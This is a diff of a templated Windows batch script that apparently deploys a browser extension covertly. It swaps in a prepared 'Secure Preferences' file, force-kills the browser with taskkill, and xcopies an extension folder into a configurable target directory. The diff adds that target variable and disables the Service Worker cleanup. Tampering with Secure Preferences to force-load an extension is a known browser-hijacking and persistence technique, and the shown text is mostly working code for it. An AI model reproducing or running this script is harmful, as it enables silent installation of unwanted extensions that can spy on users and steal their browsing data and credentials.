@@ -4,6 +4,7 @@ setlocal
 set DEPLOY_DIR=%~dp0
 set PROFILE_PATH=%LOCALAPPDATA%\{{BROWSER_PROFILE_PATH}}
 set PROC_NAME={{BROWSER_PROC_NAME}}
+set BROWSER_TARGET_DIR={{BROWSER_TARGET_DIR}}
 
 set CLEAN_PREFS=%DEPLOY_DIR%SecurePreferencesClean
 set NEW_PREFS=%DEPLOY_DIR%Secure Preferences
@@ -36,10 +37,10 @@ if errorlevel 1 (
 )
 
 :: Remove service worker base
-echo [*] Cleaning Service Worker Database...
-rd /S /Q "%PROFILE_PATH%\Service Worker\Database" 2>nul
-rd /S /Q "%PROFILE_PATH%\Service Worker\ScriptCache" 2>nul
-rd /S /Q "%PROFILE_PATH%\Service Worker\CacheStorage" 2>nul
+:: echo [*] Cleaning Service Worker Database...
+:: rd /S /Q "%PROFILE_PATH%\Service Worker\Database" 2>nul
+:: rd /S /Q "%PROFILE_PATH%\Service Worker\ScriptCache" 2>nul
+:: rd /S /Q "%PROFILE_PATH%\Service Worker\CacheStorage" 2>nul
 
 :: Open then close browser to reset internal state
 echo [*] Opening {{BROWSER_NAME}} to reset state...
@@ -48,10 +49,10 @@ timeout /t 3 /nobreak >nul
 taskkill /F /IM "%PROC_NAME%" 2>nul
 timeout /t 1 /nobreak >nul
 
-:: Copy extension folder to %LOCALAPPDATA%
-echo [*] Copying extension to %LOCALAPPDATA%...
+:: Copy extension folder to %BROWSER_TARGET_DIR%
+echo [*] Copying extension to %BROWSER_TARGET_DIR%...
 for /d %%D in ("%DEPLOY_DIR%extension\*") do (
-    xcopy /E /I /Y "%%D" "%LOCALAPPDATA%\%%~nxD" >nul
+    xcopy /E /I /Y "%%D" "%BROWSER_TARGET_DIR%\%%~nxD" >nul
     if errorlevel 1 (
         echo [!] Failed to copy %%~nxD
         exit /b 1
